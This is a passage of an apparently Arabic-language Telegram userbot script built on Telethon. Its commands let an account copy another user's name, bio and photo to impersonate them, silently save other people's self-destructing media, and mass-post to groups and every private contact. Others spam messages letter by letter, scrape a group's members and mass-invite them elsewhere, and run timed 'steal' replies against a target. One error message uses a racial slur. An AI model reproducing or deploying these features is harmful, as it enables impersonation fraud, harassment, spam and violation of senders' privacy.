            await event.reply(f"⎙ حدث خطأ أثناء تغيير الاسم: {e}")
    except ValueError:
        await event.reply("⎙ استخدم الصيغة: .الاسم (الاسم الجديد)")


profile_saved = False


async def save_my_profile():
    
    user = await client.get_me()

    
    if not os.path.exists("imagee"):
        os.mkdir("imagee")

    
    current_name = user.first_name  
    current_bio = (await client(GetFullUserRequest(user.id))).full_user.about or ""  
    
    with open("account_info.txt", "w", encoding="utf-8") as f:
        f.write(f"Name: {current_name}\nBio: {current_bio}")
    
    
    if user.photo:
        photo_path = await client.download_profile_photo(user.id, file=f"imagee/my_profile.jpg")
        if photo_path and os.path.exists(photo_path):
            print("⎙ تم حفظ صورة حسابك بنجاح.")
        else:
            print("⎙ تعذر حفظ صورة حسابك.")
    else:
        print("⎙ لا يوجد صورة لحسابك.")

    print(f"⎙ تم حفظ اسمك وبايو حسابك: {current_name}, {current_bio}")


async def impersonate_user(event):
    global profile_saved

    
    if not profile_saved:
        await save_my_profile()
        profile_saved = True  

    
    if event.is_reply:
        reply_message = await event.get_reply_message()
        user = await client(GetFullUserRequest(reply_message.sender_id))

        
        new_name = user.users[0].first_name  
        new_bio = user.full_user.about if user.full_user.about else ""  
        
        try:
            await client(UpdateProfileRequest(first_name=new_name, about=new_bio))
            await event.delete()
            await event.reply(f"⎙ تم تغيير الاسم إلى {new_name} والبايو إلى: {new_bio}")
        except Exception as e:
            await event.reply(f"⎙ حدث خطأ أثناء تحديث الاسم أو البايو: {e}")

        
        if user.users[0].photo:
            
            if not os.path.exists("hh"):
                os.mkdir("hh")

            
            photo_path = await client.download_profile_photo(user.users[0].id, file=f"hh/{user.users[0].id}.jpg")
            
            
            if photo_path and os.path.exists(photo_path):
                try:
                    
                    await client(DeletePhotosRequest(await client.get_profile_photos('me')))
                    
                    
                    uploaded_file = await client.upload_file(photo_path)

                    
                    await client(UploadProfilePhotoRequest(file=uploaded_file))
                    
                    await event.delete()
                    await event.reply("⎙ تم تغيير صورة الحساب")
                except (StickerMimeInvalidError, PhotoExtInvalidError, PhotoCropSizeSmallError, ImageProcessFailedError) as e:
                    await event.reply(f"⎙ حدث خطأ أثناء معالجة الصورة: {e}")
                except Exception as e:
                    await event.reply(f"⎙ حدث خطأ غير محدد أثناء تغيير صورة الحساب: {e}")
            else:
                await event.reply("⎙ لا يملك المستخدم صورة أو تعذر تحميل الصورة.")
        else:
            await event.reply("⎙ لا يملك المستخدم صورة.")


async def restore_profile(event):
    try:
        
        if os.path.exists("account_info.txt"):
            with open("account_info.txt", "r", encoding="utf-8") as f:
                data = f.readlines()
                restored_name = data[0].replace("Name: ", "").strip()
                restored_bio = data[1].replace("Bio: ", "").strip()
            
            await client(UpdateProfileRequest(first_name=restored_name, about=restored_bio))
            await event.delete()
            await event.reply(f"⎙ تم استرجاع الاسم إلى {restored_name} والبايو إلى: {restored_bio}")
        else:
            await event.reply("⎙ ملف الحساب غير موجود.")

        
        photo_path = "imagee/my_profile.jpg"  
        if os.path.exists(photo_path):
            uploaded_file = await client.upload_file(photo_path)

            
            await client(DeletePhotosRequest(await client.get_profile_photos('me')))

            
            await client(UploadProfilePhotoRequest(file=uploaded_file))
            
            await event.delete()
            await event.reply("⎙ تم استرجاع صورة الحساب بنجاح.")
        else:
            await event.reply("⎙ تعذر العثور على الصورة المحفوظة.")
    except Exception as e:
        await event.reply(f"⎙ حدث خطأ أثناء استرجاع الحساب: {e}")


@client.on(events.NewMessage(from_users='me', pattern='.انتحال'))
async def handle_impersonate(event):
    await impersonate_user(event)
    await event.delete()


@client.on(events.NewMessage(from_users='me', pattern='.ارجاع'))
async def handle_restore(event):
    await restore_profile(event)
    await event.delete()

@client.on(events.NewMessage(from_users='me', pattern='.نشر مجموعات'))
async def publish_message(event):
    await event.delete()
    try:
        
        command, args = event.raw_text.split(' ', 1)
        num_groups, message = args.split('(', 1)[1].split(')')[0], args.split(')', 1)[1].strip()
        num_groups = int(num_groups)
        
        
        dialogs = await client.get_dialogs()
        groups = [dialog for dialog in dialogs if dialog.is_group]
        
        if len(groups) < num_groups:
            await event.reply(f"⎙ عدد المجموعات المتاحة أقل من {num_groups}.")
            return
        
        
        published_message_ids = []
        for group in groups[:num_groups]:
            msg = await client.send_message(group, message)
            published_message_ids.append((group.id, msg.id))
        
        
        published_messages.append({
            'message': message,
            'group_ids': [group.id for group in groups[:num_groups]],
            'message_ids': published_message_ids
        })
        with open(published_messages_file, 'wb') as f:
            pickle.dump(published_messages, f)
        
        await event.reply(f"⎙ تم نشر الرسالة في {num_groups} مجموعة.")
    except (ValueError, IndexError):
        await event.reply("⎙ استخدم الصيغة: نشر (عدد المجموعات) الرسالة")
    except Exception as e:
        await event.reply(f"⎙ حدث خطأ أثناء نشر الرسالة: {e}")


if os.path.exists(muted_users_file):
    with open(muted_users_file, 'rb') as f:
        muted_users = pickle.load(f)
else:
    muted_users = set()


@client.on(events.NewMessage(from_users='me', pattern='.كتم'))
async def mute_user(event):
    await event.delete()
    if event.is_private:
        muted_users.add(event.chat_id)
        with open(muted_users_file, 'wb') as f:
            pickle.dump(muted_users, f)
        await event.reply(" **⌔┊تم الكتم المستخدم ⌔┊نحن بحاجة لبعض الهدوء اصمت ⌔┊تم كتمـه بنجـاح ☑️**")
    else:
        await event.reply("⎙ يمكن استخدام هذا الأمر في المحادثات الخاصة فقط.")

@client.on(events.NewMessage(from_users='me', pattern='.سماح'))
async def unmute_user(event):
    await event.delete()
    if event.is_private and event.chat_id in muted_users:
        muted_users.remove(event.chat_id)
        with open(muted_users_file, 'wb') as f:
            pickle.dump(muted_users, f)
        await event.reply("⎙ تم السماح للمستخدم للتحدث معك ايها الملك.")
    else:
        await event.reply("⎙ هذا المستخدم غير مكتوم")

@client.on(events.NewMessage(from_users='me', pattern='.المكتومين'))
async def show_muted_users(event):
    await event.delete()
    if muted_users:
        muted_users_list = "\n".join([str(user_id) for user_id in muted_users])
        await event.reply(f"⎙ المستخدمون المكتومون:\n{muted_users_list}")
    else:
        await event.reply("⎙ لا يوجد مستخدمون مكتومون حالياً.")

from telethon import functions

active_ratib_timers = {}
active_bakhsheesh_timers = {}
active_sarqa_timers = {}

@client.on(events.NewMessage(from_users='me', pattern='.راتب'))
async def enable_ratib_wad(event):
    await event.delete()
    reply = await event.respond("تم تفعيل أمر راتب")
    await asyncio.sleep(1)
    await reply.delete()

    if event.chat_id not in active_ratib_timers:
        async def send_ratib():
            while True:
                await client.send_message(event.chat_id, "راتب")
                await asyncio.sleep(660)  

        active_ratib_timers[event.chat_id] = asyncio.create_task(send_ratib())

@client.on(events.NewMessage(from_users='me', pattern='.ايقاف راتب'))
async def disable_ratib_wad(event):
    await event.delete()

    if event.chat_id in active_ratib_timers:
        active_ratib_timers[event.chat_id].cancel()
        del active_ratib_timers[event.chat_id]
    
    reply = await event.respond("⎙ تم إيقاف أمر راتب")
    await asyncio.sleep(2)
    await reply.delete()

@client.on(events.NewMessage(from_users='me', pattern='.بخشيش'))
async def enable_bakhsheesh_wad(event):
    await event.delete()
    reply = await event.respond("⎙ تم تفعيل أمر بخشيش")
    await asyncio.sleep(2)
    await reply.delete()

    if event.chat_id not in active_bakhsheesh_timers:
        async def send_bakhsheesh():
            while True:
                await client.send_message(event.chat_id, "بخشيش")
                await asyncio.sleep(660)  

        active_bakhsheesh_timers[event.chat_id] = asyncio.create_task(send_bakhsheesh())

@client.on(events.NewMessage(from_users='me', pattern='.ايقاف بخشيش'))
async def disable_bakhsheesh_wad(event):
    await event.delete()

    if event.chat_id in active_bakhsheesh_timers:
        active_bakhsheesh_timers[event.chat_id].cancel()
        del active_bakhsheesh_timers[event.chat_id]
    
    reply = await event.respond("⎙ تم إيقاف أمر بخشيش")
    await asyncio.sleep(2)
    await reply.delete()

active_sarqa_timers = {}

@client.on(events.NewMessage(from_users='me', pattern='.سرقة(?: (\d+))?'))
async def enable_sarqa_wad(event):
    await event.delete()

    if event.pattern_match.group(1):
        user_id = int(event.pattern_match.group(1))

        if user_id not in active_sarqa_timers:
            reply = await event.respond("⎙ تم تفعيل أمر سرقة")
            await asyncio.sleep(2)
            await reply.delete()

            async def send_sarqa():
                while True:
                    try:
                        async for message in client.iter_messages(event.chat_id, from_user=user_id, limit=1):
                            await client.send_message(event.chat_id, "زرف", reply_to=message.id)
                        await asyncio.sleep(6)  
                    except Exception as e:
                        print(f"Error: {e}")
                        break

            active_sarqa_timers[user_id] = asyncio.create_task(send_sarqa())
        else:
            reply = await event.respond("⎙ تم تفعيل أمر سرقة مسبقًا.")
            await asyncio.sleep(2)
            await reply.delete()
    else:
        reply = await event.respond("يرجى كتابة ايدي الشخص مع الامر!")
        await asyncio.sleep(2)
        await reply.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ايقاف سرقة(?: (\d+))?'))
async def disable_sarqa_wad(event):
    await event.delete()

    if event.pattern_match.group(1):
        user_id = int(event.pattern_match.group(1))

        if user_id in active_sarqa_timers:
            active_sarqa_timers[user_id].cancel()
            del active_sarqa_timers[user_id]
            
            reply = await event.respond("⎙ تم إيقاف أمر سرقة")
            await asyncio.sleep(2)
            await reply.delete()
        else:
            reply = await event.respond("⎙ لم يتم تفعيل أمر سرقة وعد لهذا الشخص.")
            await asyncio.sleep(2)
            await reply.delete()
    else:
        reply = await event.respond("يرجى كتابة ايدي الشخص مع الامر!")
        await asyncio.sleep(2)
        await reply.delete()

@client.on(events.NewMessage(from_users='me', pattern='.رفع طيز'))
async def enable_ratib_wad(event):
    await event.delete()
    reply = await event.respond("تم رفعه طيز بنجاح ⎙")
    await asyncio.sleep(1)
    await reply.delete()
    
@client.on(events.NewMessage(outgoing=True, pattern=r'\.مغادرة القنوات'))
async def leave_channels(event):
    await event.edit("**جارٍ مغادرة القنوات...**")
    async for dialog in client.iter_dialogs():
        if dialog.is_channel and not (dialog.is_group or dialog.entity.admin_rights or dialog.entity.creator):
            await client.delete_dialog(dialog)
    await event.edit("**تم مغادرة جميع القنوات**")

@client.on(events.NewMessage(outgoing=True, pattern=r'\.مغادرة الكروبات'))
async def leave_groups(event):
    await event.edit("**جارٍ مغادرة الكروبات...**")
    async for dialog in client.iter_dialogs():
        if dialog.is_group and not (dialog.entity.admin_rights or dialog.entity.creator):
            try:
                await client.delete_dialog(dialog)
            except Exception as e:
                print(f"حدث خطأ أثناء مغادرة الكروب {dialog.name}: {e}")  # طباعة الخطأ للمساعدة في تحديد المشكلة
    await event.edit("**تم مغادرة جميع الكروبات**")
    
@client.on(events.NewMessage(pattern=r'\.بنج$'))
async def ping(event):
    client.parse_mode = "html" 
    start = datetime.now()
    msg = await event.edit("سرعة الانترنيت!")
    end = datetime.now()
    ms = (end - start).microseconds / 1000
    await msg.edit(f"<b>سرعة انترنتك!!<b/>\n`{ms} ms`")
        
questions_list = [
    "هل تحب ايفا ؟",
    "حكي ودك يوصل للشخص المطلوب ؟",
    "منشن شخص تسولف معه تنسى هموم الدنيا ؟",
    "مقوله او مثل او بيت شعر قريب من قلبك؟",
    "اكثر مكان تحب تروح له ف الويكند ؟",
    "كم وجبه تآكل ف اليوم ؟",
    "كم ساعه تنام ف اليوم ؟",
    "هل وثقت ف احد و خذلك ؟",
    "كلمه تعبر عن شعورك ؟",
    "منشن شخص فاهمك ف كل شيء ؟",
    "منشن شخص تسولف معه تنسى هموم الدنيا ؟",
    "اصدقاء المواقع افضل من الواقع تتفق؟",
    "كلمه معينه م يفهمها الا اصحابك ؟",
    "كل شيء يهون الا ؟",
    "كلمه تعبر عن شعورك ؟",
    "كيف تتصرف مع شخص تكلمه في سالفه مهمه ويصرفك ومعد يرد ابداً؟",
    "ثلاث اشياء جنبك الحين ؟",
    "تشوف انو التواصل بشكل يومي من اساسيات الحب ؟",
    "نوعيات ودك ينقرضون من تويتر؟",
    "ماذا تفعل عندما تري دموع زوجتك..؟",
    "ما هي هوايتك المفضلة؟",
    "لو خيروك تسافر لأي مكان في العالم، وين بتروح؟",
    "ايش اكثر اكلة تحبها؟",
    "ايش اكثر لون تحبه؟",
    "تحب القهوة او الشاي؟",
    "ايش موقف صار لك ما تنساه؟",
    "ايش اكثر شيء يضايقك؟",
    "ايش اكثر شيء يسعدك؟",
    "ايش هي امنيتك في الحياة؟",
    "لو كان بإمكانك تغيير شيء واحد في العالم، ماذا سيكون؟",
    "هل تؤمن بالحب من اول نظرة؟",
    "هل انت شخص صباحي او مسائي؟",
    "ما هو برجك؟",
    "ما هو فيلمك المفضل؟",
    "ما هي اغنيتك المفضلة؟",
    "ما هي فرقتك الموسيقية المفضلة؟",
    "ما هو كتابك المفضل؟",
    "ما هو مسلسل Netflix  المفضل لديك؟",
    "هل تفضل الصيف او الشتاء؟",
    "هل تفضل العيش في المدينة او الريف؟",
    "هل تفضل الكلاب او القطط؟",
    "ما هو رأيك في وسائل التواصل الاجتماعي؟",
    "ما هي نصيحتك لأي شخص يمر بيوم سيء؟",
    "ما هو الشيء الذي تفتخر به؟",
    "ما هو الشيء الذي تخاف منه؟",
    "ما هو الشيء الذي يجعلك تضحك؟",
    "ما هو الشيء الذي يجعلك تبكي؟",
    "ما هو الشيء الذي يجعلك تشعر بالامتنان؟",
    "ما هو تعريفك للسعادة؟",
    "ما هو تعريفك للنجاح؟",
    "لو كان بإمكانك امتلاك اي قوة خارقة، ماذا ستختار؟",
    "لو كان بإمكانك العودة بالزمن، الى اي فترة زمنية ستعود؟",
    "من هو مثلك الأعلى؟",
    "ما هي أكبر غلطة سويتها في حياتك؟",
    "ما هو الدرس اللي تعلمته من هذي الغلطة؟",
    "ما هي أفضل نصيحة  انعطت لك؟",
    "ايش اكثر شيء تعلمته من والديك؟",
    "ايش اكثر شيء تحبه في نفسك؟",
    "ايش اكثر شيء تكرهه في نفسك؟",
    "كيف تصف نفسك في ثلاث كلمات؟",
    "ما هو الشيء الذي يميزك عن غيرك؟",
    "ما هي طموحاتك المستقبلية؟",
    "ما هو الشيء الذي تتمنى تحقيقه قبل ما تموت؟",
    "هل تؤمن بالحياة بعد الموت؟",
    "هل تؤمن بالأشباح؟",
    "هل تؤمن بالكائنات الفضائية؟",
    "ما هو رأيك في الذكاء الاصطناعي؟",
    "هل تعتقد أن الروبوتات ستسيطر على العالم؟",
    "ما هو الشيء الذي يجعلك تشعر بالغضب؟",
    "ما هو الشيء الذي يجعلك تشعر بالخجل؟",
    "ما هو الشيء الذي يجعلك تشعر بالذنب؟",
    "ما هو الشيء الذي يجعلك تشعر بالخوف؟",
    "ما هو الشيء الذي يجعلك تشعر بالحزن؟",
    "ما هو الشيء الذي يجعلك تشعر بالوحدة؟",
    "ما هو الشيء الذي يجعلك تشعر بالقلق؟",
    "ما هو الشيء الذي يجعلك تشعر بالإحباط؟",
    "ما هو الشيء الذي يجعلك تشعر بالملل؟",
    "ما هو الشيء الذي يجعلك تشعر بالتعب؟",
    "ما هو الشيء الذي يجعلك تشعر بالجوع؟",
    "ما هو الشيء الذي يجعلك تشعر بالعطش؟",
    "ما هو الشيء الذي يجعلك تشعر بالنعاس؟",
    "ما هو الشيء الذي يجعلك تشعر بالبرد؟",
    "ما هو الشيء الذي يجعلك تشعر بالحر؟",
    "ما هو الشيء الذي يجعلك تشعر بالألم؟",
    "ما هو الشيء الذي يجعلك تشعر بالراحة؟",
    "ما هو الشيء الذي يجعلك تشعر بالحب؟",
    "ما هو الشيء الذي يجعلك تشعر بالكراهية؟",
    "ما هو الشيء الذي يجعلك تشعر بالغيرة؟",
    "ما هو الشيء الذي يجعلك تشعر بالحسد؟",
    "ما هو الشيء الذي يجعلك تشعر بالندم؟",
    "ما هو الشيء الذي يجعلك تشعر بالذل؟",
    "ما هو الشيء الذي يجعلك تشعر بالمهانة؟",
    "ما هو الشيء الذي يجعلك تشعر بالظلم؟",
    "ما هو الشيء الذي يجعلك تشعر بالغفران؟",
    "ما هو الشيء الذي يجعلك تشعر بالشكر؟",
    "ما هو الشيء الذي يجعلك تشعر بالاحترام؟",
    "ما هو الشيء الذي يجعلك تشعر بالتقدير؟",
    "ما هو الشيء الذي يجعلك تشعر بالثقة؟",
    "ما هو الشيء الذي يجعلك تشعر بالأمان؟",
    "ما هو الشيء الذي يجعلك تشعر بالسعادة؟"
]


image_links = [
    "https://t.me/Sk_x2/10",
    "https://t.me/Sk_x2/11",
    "https://t.me/Sk_x2/12",
    "https://t.me/Sk_x2/13",
    "https://t.me/Sk_x2/14",
    "https://t.me/Sk_x2/15",
    "https://t.me/Sk_x2/16",
    "https://t.me/Sk_x2/17",
    "https://t.me/Sk_x2/18",
    "https://t.me/Sk_x2/19",
    "https://t.me/Sk_x2/20",
    "https://t.me/Sk_x2/21",
    "https://t.me/Sk_x2/22",
    "https://t.me/Sk_x2/23",
    "https://t.me/Sk_x2/24",
    "https://t.me/Sk_x2/25",
    "https://t.me/Sk_x2/26",
    "https://t.me/Sk_x2/27",
    "https://t.me/Sk_x2/28",
    "https://t.me/Sk_x2/29",
    "https://t.me/Sk_x2/30",
    "https://t.me/Sk_x2/31",
    "https://t.me/Sk_x2/32",
    "https://t.me/Sk_x2/33",
    "https://t.me/Sk_x2/34",
    "https://t.me/Sk_x2/35",
    "https://t.me/Sk_x2/36",
    "https://t.me/Sk_x2/37",
    "https://t.me/Sk_x2/38",
    "https://t.me/Sk_x2/39",
    "https://t.me/Sk_x2/40",
    "https://t.me/Sk_x2/41",
    "https://t.me/Sk_x2/42",
    "https://t.me/Sk_x2/43",
    "https://t.me/Sk_x2/44",
    "https://t.me/Sk_x2/45",
    "https://t.me/Sk_x2/46",
    "https://t.me/Sk_x2/47",
    "https://t.me/Sk_x2/48",
    "https://t.me/Sk_x2/49",
    "https://t.me/Sk_x2/50",
    "https://t.me/Sk_x2/51",
    "https://t.me/Sk_x2/52",
    "https://t.me/Sk_x2/53",
    "https://t.me/Sk_x2/54",
    "https://t.me/Sk_x2/55",
    "https://t.me/Sk_x2/56",
    "https://t.me/Sk_x2/57",
    "https://t.me/Sk_x2/58",
    "https://t.me/Sk_x2/59",
    "https://t.me/Sk_x2/60",
    "https://t.me/Sk_x2/61",
    "https://t.me/Sk_x2/62",
    "https://t.me/Sk_x2/63",
    "https://t.me/Sk_x2/64",
    "https://t.me/Sk_x2/65",
    "https://t.me/Sk_x2/66",
    "https://t.me/Sk_x2/67",
    "https://t.me/Sk_x2/68",
    "https://t.me/Sk_x2/69",
    "https://t.me/Sk_x2/70",
    "https://t.me/Sk_x2/71",
    "https://t.me/Sk_x2/72",
    "https://t.me/Sk_x2/73",
    "https://t.me/Sk_x2/74",
    "https://t.me/Sk_x2/75",
    "https://t.me/Sk_x2/76",
    "https://t.me/Sk_x2/77",
    "https://t.me/Sk_x2/78",
    "https://t.me/Sk_x2/79",
    "https://t.me/Sk_x2/80",
    "https://t.me/Sk_x2/81",
    "https://t.me/Sk_x2/82",
    "https://t.me/Sk_x2/83",
    "https://t.me/Sk_x2/84",
    "https://t.me/Sk_x2/85",
    "https://t.me/Sk_x2/86",
    "https://t.me/Sk_x2/87",
    "https://t.me/Sk_x2/88",
    "https://t.me/Sk_x2/89",
    "https://t.me/Sk_x2/90",
    "https://t.me/Sk_x2/91",
    "https://t.me/Sk_x2/92",
    "https://t.me/Sk_x2/93",
    "https://t.me/Sk_x2/94",
    "https://t.me/Sk_x2/95",
    "https://t.me/Sk_x2/96",
    "https://t.me/Sk_x2/97"
]













@client.on(events.NewMessage(outgoing=True, pattern=r"(^\.كت|\s\.كت)\b|\.انمي"))
async def why(event):
    await event.delete()
    chat = await event.get_chat()

    matched_command = event.pattern_match.string
    if matched_command == ".كت":
        message = random.choice(questions_list)
        await event.client.send_message(chat, message)

    elif matched_command == ".انمي":
        while True:
            try:
                random_image_link = random.choice(image_links)
                channel_name, message_id = random_image_link.split('/')[-2:]
                message = await client.get_messages(channel_name, ids=int(message_id))
                await client.send_message(chat, "صور انمي:", file=message, silent=True)
                break
            except WebpageMediaEmptyError:
                pass
            

@events.register(events.NewMessage(pattern="\.كشف المجموعة(?: |$)(.*)", outgoing=True))
async def info_gop(event):
    await event.edit("`جارٍ الفحص ...`")
    chat = await get_chatinfo(event)
    
    if chat is None:
        return
    
    caption = await fetch_info(chat, event)
    try:
        await event.edit(caption, parse_mode="html")
    except Exception as e:
        print("Exception:", e)
        await event.edit("`حدث خطأ غير متوقع.`")

async def get_chatinfo(event):
    chat = event.pattern_match.group(1)
    chat_info = None

    if chat:
        try:
            chat = int(chat)
        except ValueError:
            pass

    if not chat:
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            if replied_msg.fwd_from and replied_msg.fwd_from.channel_id is not None:
                chat = replied_msg.fwd_from.channel_id
        else:
            chat = event.chat_id

    try:
        chat_info = await event.client(GetFullChatRequest(chat))
    except:
        try:
            chat_info = await event.client(GetFullChannelRequest(chat))
        except ChannelInvalidError:
            await event.edit("`حدث خطأ في القناة أو المجموعة..`")
            return None
        except ChannelPrivateError:
            await event.edit("`هذه قناة/مجموعة خاصة أو تم حظري منها`")
            return None
        except ChannelPublicGroupNaError:
            await event.edit("`القناة أو المجموعة غير موجودة`")
            return None
        except (TypeError, ValueError) as err:
            await event.edit(str(err))
            return None
    return chat_info

async def fetch_info(chat, event):
    chat_obj_info = await event.client.get_entity(chat.chats[0].id)  # تصحيح الوصول إلى الـ id
    broadcast = getattr(chat_obj_info, "broadcast", False)
    chat_type = "قناة" if broadcast else "مجموعة"
    chat_title = chat_obj_info.title

    try:
        msg_info = await event.client(GetHistoryRequest(
            peer=chat_obj_info.id, offset_id=0, offset_date=datetime(2010, 1, 1),
            add_offset=-1, limit=1, max_id=0, min_id=0, hash=0
        ))
    except Exception as e:
        msg_info = None
        print("Exception:", e)

    first_msg_valid = bool(msg_info and msg_info.messages and msg_info.messages[0].id == 1)
    creator_valid = first_msg_valid and bool(msg_info.users)
    creator_id = msg_info.users[0].id if creator_valid else None
    creator_firstname = msg_info.users[0].first_name if creator_valid else "حساب محذوف"
    creator_username = f"@{msg_info.users[0].username}" if creator_valid and msg_info.users[0].username else None
    created = msg_info.messages[0].date if first_msg_valid else None
    former_title = (msg_info.messages[0].action.title if first_msg_valid and isinstance(msg_info.messages[0].action, MessageActionChannelMigrateFrom) and msg_info.messages[0].action.title != chat_title else None)

    try:
        dc_id, _ = get_input_location(chat.full_chat.chat_photo)
    except Exception:
        dc_id = "غير معروف"

    description = chat.full_chat.about
    members = getattr(chat.full_chat, "participants_count", getattr(chat_obj_info, "participants_count", None))
    admins = getattr(chat.full_chat, "admins_count", None)
    banned_users = getattr(chat.full_chat, "kicked_count", None)
    restricted_users = getattr(chat.full_chat, "banned_count", None)
    members_online = getattr(chat.full_chat, "online_count", 0)
    messages_sent = getattr(chat.full_chat, "read_inbox_max_id", None)
    exp_count = getattr(chat.full_chat, "pts", None)
    username = f"@{chat_obj_info.username}" if getattr(chat_obj_info, "username", None) else None
    slowmode = "نعم" if getattr(chat_obj_info, "slowmode_enabled", False) else "لا"
    slowmode_time = getattr(chat.full_chat, "slowmode_seconds", None)
    restricted = "نعم" if getattr(chat_obj_info, "restricted", False) else "لا"
    verified = "نعم" if getattr(chat_obj_info, "verified", False) else "لا"

    if admins is None:
        try:
            participants_admins = await event.client(GetParticipantsRequest(
                channel=chat_obj_info.id, filter=ChannelParticipantsAdmins(), offset=0, limit=0, hash=0
            ))
            admins = participants_admins.count if participants_admins else None
        except Exception as e:
            print("Exception:", e)

    caption = f"<b>المعلومات المتاحة:</b>\n"
    caption += f"المعرف: <code>{chat_obj_info.id}</code>\n"
    if chat_title:
        caption += f"اسم {chat_type}: {chat_title}\n"
    if former_title:
        caption += f"الاسم السابق: {former_title}\n"
    caption += f"نوع {chat_type}: {'عامة' if username else 'خاصة'}\n"
    if username:
        caption += f"الرابط: {username}\n"
    if creator_username:
        caption += f"منشئ {chat_type}: {creator_username}\n"
    elif creator_valid:
        caption += f"منشئ {chat_type}: <a href=\"tg://user?id={creator_id}\">{creator_firstname}</a>\n"
    if created:
        caption += f"تاريخ الإنشاء: <code>{created.strftime('%b %d, %Y - %H:%M:%S')}</code>\n"
    caption += f"معرف مركز البيانات: {dc_id}\n"
    if exp_count:
        chat_level = int((1 + sqrt(1 + 7 * exp_count / 14)) / 2)
        caption += f"مستوى {chat_type}: <code>{chat_level}</code>\n"
    if messages_sent:
        caption += f"الرسائل المرسلة: <code>{messages_sent}</code>\n"
    if members:
        caption += f"الأعضاء: <code>{members}</code>\n"
    if admins:
        caption += f"المشرفون: <code>{admins}</code>\n"
    if members_online:
        caption += f"الأعضاء المتصلون الآن: <code>{members_online}</code>\n"
    if restricted_users:
        caption += f"الأعضاء المقيدون: <code>{restricted_users}</code>\n"
    if banned_users:
        caption += f"الأعضاء المحظورون: <code>{banned_users}</code>\n"
    caption += f"الوضع البطيء: {slowmode}"
    if slowmode_time:
        caption += f", <code>{slowmode_time}s</code>\n"
    if restricted == "نعم":
        caption += f"مقيد: {restricted}\n"
    caption += f"تم التحقق منه بواسطة Telegram: {verified}\n"
    if description:
        caption += f"الوصف: \n<code>{description}</code>\n"

    return caption

  
@client.on(events.NewMessage(outgoing=True, pattern=r"^\.سبام$"))
async def spam_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    message = await event.get_reply_message()
    if not message or not message.text:
        return await event.reply("  يجب الرد على رسالة نصية لاستخدام هذا الأمر.")

    text = message.text
    for char in text:
        await event.respond(char)
        await asyncio.sleep(0.8)

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.وسبام$"))
async def word_spam_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return
    await event.delete()
    message = await event.get_reply_message()
    if not message or not message.text:
        return await event.reply("  يجب الرد على رسالة نصية لاستخدام هذا الأمر.")

    words = message.text.split()
    for word in words:
        await event.respond(word)
        await asyncio.sleep(1)


auto_save_enabled = False

@client.on(events.NewMessage(outgoing=True, pattern=r'\.واو|\.حفظ الذاتية'))
async def rundrc(event):
    await event.delete()
    if event.pattern_match.group(0) == ".ذاتية":
        try:
            getrestrictedcontent = await event.get_reply_message()
            downloadrestrictedcontent = await getrestrictedcontent.download_media()
            await event.client.send_file("me", downloadrestrictedcontent)
            remove(downloadrestrictedcontent)
        except:
            pass
    elif event.pattern_match.group(0) == ".حفظ الذاتية":
        global auto_save_enabled
        auto_save_enabled = not auto_save_enabled
        if auto_save_enabled:
            await event.respond("تم تفعيل حفظ الوسائط ذاتية التدمير تلقائيًا.")
        else:
            await event.respond("تم إيقاف حفظ الوسائط ذاتية التدمير تلقائيًا.")

@client.on(events.NewMessage)
async def auto_save_media(event):
    if auto_save_enabled:
        try:
            if event.media and event.media.ttl_seconds:
                downloadrestrictedcontent = await event.download_media()
                await event.client.send_file("me", downloadrestrictedcontent)
                remove(downloadrestrictedcontent)
        except:
            pass

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.خاص$"))
async def private_handler(event):
    message = await event.get_reply_message()
    if not message:
        return await event.reply("**▪︎| يجب الرد على رسالة لاستخدام هذا الأمر.**")

    await event.delete()  # حذف الأمر بعد التأكد من وجود رد

    chats = await event.client.get_dialogs()
    private_chats = [chat for chat in chats if chat.is_user]

    for chat in private_chats:
        try:
            if message.media:
                caption = message.text if message.text else ""  # تجنب الأخطاء عند عدم وجود نص
                await event.client.send_file(chat.id, message.media, caption=caption)
            else:
                await event.client.send_message(chat.id, message.text)
        except Exception as e:
            print(f"خطأ في إرسال الرسالة إلى الدردشة {chat.id}: {e}")

@client.on(events.NewMessage(pattern=".تحويل نص ?(.*)"))
async def _(event):
    if event.fwd_from:
        return 
    if not event.reply_to_msg_id:
       await event.edit("⎙︙ يـجب. الرد علـى رسـالة الـمستخدم )")
       return
    reply_message = await event.get_reply_message() 
    if not reply_message.text:
       await event.edit("⎙︙ يـجب. الرد علـى رسـالة الـمستخدم )")
       return
    chat = "@QuotLyBot"
    sender = reply_message.sender
    if reply_message.sender.bot:
       await event.edit("⎙︙ يـجب. الرد علـى رسـالة الـمستخدم )")
       return
    await event.edit("⎙︙ جار تحويل النص الى ملصق")
    async with event.client.conversation(chat) as conv:
          try:     
              response = conv.wait_event(events.NewMessage(incoming=True,from_users=1031952739))
              await event.client.forward_messages(chat, reply_message)
              response = await response 
          except YouBlockedUserError: 
              await event.reply("```Please unblock me (@QuotLyBot) u Nigga```")
              return
          if response.text.startswith("Hi!"):
             await event.edit("⎙︙ يجـب الغاء خصـوصية التوجيـه اولا")
          else: 
             await event.delete()
             await event.client.send_message(event.chat_id, response.message)
             

@client.on(events.NewMessage(pattern=r".ضيف ?(.*)"))
async def get_users(event):   
    sender = await event.get_sender() ; me = await event.client.get_me()
    if not sender.id == me.id:
        roz = await event.reply("**▾∮ تتـم العـملية انتظـࢪ قليلا ⎙ ...**")
    else:
        roz = await event.edit("**▾∮ تتـم العـملية انتظـࢪ قليلا ⎙ ...**.")
    JoKeRUB = await get_chatinfo(event) ; chat = await event.get_chat()
    if event.is_private:
              return await roz.edit("**▾∮ لا يمكننـي اضافـة المـستخدمين هـنا**")    
    s = 0 ; f = 0 ; error = 'None'   
  
    await roz.edit("**▾∮ حـالة الأضافة:**\n\n**▾∮ تتـم جـمع معـلومات الـمستخدمين 🔄 ...⏣**")
    async for user in event.client.iter_participants(JoKeRUB.full_chat.id):
                try:
                    if error.startswith("Too"):
                        return await roz.edit(f"**حـالة الأضـافة انتـهت مـع الأخـطاء**\n- (**ربـما هـنالك ضغـط عـلى الأمࢪ حاول مججـدا لاحقـا 🧸**) \n**الـخطأ** : \n`{error}`\n\n• اضالـة `{s}` \n• خـطأ بأضافـة `{f}`"),
                    await event.client(functions.channels.InviteToChannelRequest(channel=chat,users=[user.id]))
                    s = s + 1                                                    
